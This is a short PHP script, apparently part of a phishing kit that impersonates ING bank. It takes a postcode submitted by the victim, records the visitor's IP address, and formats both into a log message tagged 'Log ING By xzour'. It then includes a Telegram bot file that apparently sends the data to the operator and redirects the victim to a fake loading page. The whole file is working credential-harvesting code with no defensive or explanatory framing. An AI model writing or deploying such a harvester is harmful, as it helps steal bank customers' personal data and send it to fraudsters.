<?php

$Xzour = getenv("REMOTE_ADDR");

$message .= "--++-----[ Confirm postcode ]-----++--\n";

$message .= "postcode: ".$_POST['pcode']."\n";

$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $Xzour\n";
$subject = "Log ING By xzour [ " . $Xzour . " ] ";
include('./telegram_bot.php');

 header("Location: ../A.php?channel=true&form=loading&idiunsdyusjhsuidsujdsuks=");

?>
